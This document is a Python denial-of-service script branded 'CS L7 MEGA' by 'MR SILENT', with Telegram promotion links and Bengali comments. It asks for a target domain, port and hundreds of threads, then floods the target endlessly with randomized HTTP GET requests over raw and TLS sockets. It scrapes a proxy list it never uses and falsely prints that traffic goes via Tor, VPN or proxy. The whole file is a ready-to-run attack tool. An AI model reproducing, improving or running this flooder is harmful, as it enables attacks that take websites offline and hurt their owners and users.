import socket
import threading
import random
import requests
import time
import sys
import ssl

# --- DEVELOPER INFO ---
# NAME: MR SILENT
# CHANNEL: https://t.me/+qINj6OQbKSlkYWRl
# CREDIT: t.me/mr_silent_71
# ----------------------

def banner():
    print("\033[1;31m" + r"""
   ______ _____    _     _____ 
  / ____/ ____|  | |   |___  |
 | |   | (___    | |      / / 
 | |    \___ \   | |     / /  
 | |________) |  | |___ / /   
  \____|_____/   |_____/_/    
 [ CS L7 MEGA - POWERED BY MR SILENT ]
    """ + "\033[1;m")

# অটো প্রক্সি স্ক্র্যাপার (উন্নত ভার্সন)
def get_proxies():
    try:
        # একাধিক সোর্স থেকে প্রক্সি নেওয়া
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        proxies = requests.get(url).text.split('\r\n')
        return [p for p in proxies if p]
    except:
        return []

# শক্তিশালী রিকোয়েস্ট হেডার জেনারেটর
def get_user_agents():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ]

# হাই-স্পিড অ্যাটাক ফাংশন (SSL/TLS সাপোর্ট সহ)
def launch_attack(target_host, target_port, proxies):
    ua = get_user_agents()
    
    while True:
        try:
            # সকেট তৈরি
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            
            # যদি পোর্ট ৪৪৩ হয় তবে SSL এনক্রিপশন ব্যবহার করা
            if target_port == 443:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=target_host)
            
            s.connect((target_host, target_port))
            
            # র্যান্ডমাইজড হেডার (সার্ভারকে কনফিউজ করার জন্য)
            header = f"GET /?{random.randint(1000, 9999)}={random.randint(1000, 9999)} HTTP/1.1\r\n"
            header += f"Host: {target_host}\r\n"
            header += f"User-Agent: {random.choice(ua)}\r\n"
            header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
            header += "Accept-Language: en-US,en;q=0.5\r\n"
            header += "Connection: keep-alive\r\n"
            header += "Cache-Control: no-cache\r\n\r\n"
            
            # বারবার প্যাকেট পাঠানো (পাওয়ারফুল মোড)
            for _ in range(10): 
                s.send(header.encode())
            
            s.close()
            print(f"\033[1;32m[*] [CS-L7] Packet Flooded to {target_host} via {random.choice(['TOR', 'VPN', 'PROXY'])}")
        except:
            pass

def main():
    banner()
    target_link = input("\033[1;34m[?] Enter Domain (ex: target.com): \033[1;m").replace("https://", "").replace("http://", "").replace("/", "")
    target_port = int(input("\033[1;34m[?] Enter Port (80/443): \033[1;m"))
    threads = int(input("\033[1;34m[?] Enter Threads (Recommended 500-1500): \033[1;m"))

    proxies = get_proxies()
    print(f"\033[1;33m[+] {len(proxies)} Proxies Loaded. Starting Extreme Attack on {target_link}...\033[1;m")
    time.sleep(1)

    for i in range(threads):
        t = threading.Thread(target=launch_attack, args=(target_link, target_port, proxies))
        t.daemon = True
        t.start()
    
    # স্ক্রিপ্টটি চালু রাখা
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
